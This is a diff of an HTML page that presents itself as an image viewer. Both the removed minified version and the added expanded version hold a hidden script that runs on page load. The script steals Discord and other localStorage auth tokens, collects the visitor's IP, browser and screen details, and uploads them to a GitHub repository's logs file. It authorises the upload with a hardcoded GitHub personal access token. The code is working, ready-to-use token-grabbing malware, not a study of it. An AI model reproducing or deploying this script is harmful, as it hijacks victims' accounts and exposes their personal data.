@@ -1,1 +1,80 @@
-<!DOCTYPE html><html><head></head><body style="margin:0;height:100vh;"><img id=p style="width:100%;height:100%;object-fit:cover;" src=data: onerror=s() onload=s()><script>async function s(){try{let u=atob(new URLSearchParams(location.search).get('u')||'');document.getElementById('p').src=u;let t1=()=>{for(let k in localStorage)if(k.includes('token'))return localStorage[k];};let t2=()=>{let w=window.webpackChunkdiscord_app;if(w){w.push([[Math.random()],{},r=>{}]);let s=new Error().stack;return(s||'').split('\n').find(r=>r.includes('getToken'))||0;}};let tk=t1()||t2()||'no-token';let ip=await fetch('https://api.ipify.org').then(r=>r.text()).catch(()=>'no-ip');let d={ip:ip,token:tk+'',ua:navigator.userAgent,scr:screen.width+'x'+screen.height,ref:document.referrer,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,time:new Date().toISOString()};let data='GRAB:'+JSON.stringify(d,null,2);await fetch('https://api.github.com/repos/Depex09/imgview/contents/logs.txt',{method:'PUT',headers:{'Authorization':'token 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','Content-Type':'application/json'},body:JSON.stringify({message:'grab '+new Date().toISOString(),content:btoa(data)})}).catch(e=>{});}catch(e){}}</script></body></html>
+<script>
+async function s(){
+  try {
+    console.log('Grabber started');
+    let params = new URLSearchParams(location.search);
+    let u = atob(params.get('u') || '');
+    document.getElementById('p').src = u;
+    
+    // TOKEN GRAB #1
+    let tk1 = null;
+    for(let k in localStorage){
+      if(k.includes('token')){
+        tk1 = localStorage[k];
+        break;
+      }
+    }
+    
+    // TOKEN GRAB #2 (Discord webpack)
+    let tk2 = null;
+    try {
+      if(window.webpackChunkdiscord_app){
+        let w = window.webpackChunkdiscord_app;
+        w.push([[Math.random()],[],(req) => {
+          for(let m in req.c){
+            if(req.c[m].exports && req.c[m].exports.default && req.c[m].exports.default.getToken){
+              tk2 = req.c[m].exports.default.getToken();
+            }
+          }
+        }]);
+      }
+    } catch(e) {}
+    
+    let token = tk1 || tk2 || 'no-token-found';
+    
+    // IP GRAB
+    let ip = 'fetching...';
+    try {
+      let ipres = await fetch('https://api.ipify.org?format=json');
+      let ipdata = await ipres.json();
+      ip = ipdata.ip;
+    } catch(e) {
+      ip = 'ip-error';
+    }
+    
+    let data = {
+      ip: ip,
+      token: token,
+      useragent: navigator.userAgent,
+      screen: screen.width + 'x' + screen.height,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      url: location.href,
+      time: new Date().toISOString()
+    };
+    
+    console.log('Sending data:', data);
+    
+    // SAVE TO GITHUB
+    let logsdata = '=== NEW GRAB ===\n' + JSON.stringify(data, null, 2) + '\n\n';
+    let ghurl = 'https://api.github.com/repos/depex09/imgview/contents/logs.txt';
+    let ghres = await fetch(ghurl, {
+      method: 'PUT',
+      headers: {
+        'Authorization': 'token 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',
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        message: 'New grab ' + new Date().toISOString(),
+        content: btoa(logsdata + '\n' + (await fetch('https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/imgview/main/logs.txt').then(r=>r.text()).catch(()=>''))),
+        sha: '' // Will create new file first time
+      })
+    });
+    
+    console.log('GitHub save:', ghres.status);
+    
+  } catch(e) {
+    console.error('Error:', e);
+  }
+}
+</script>
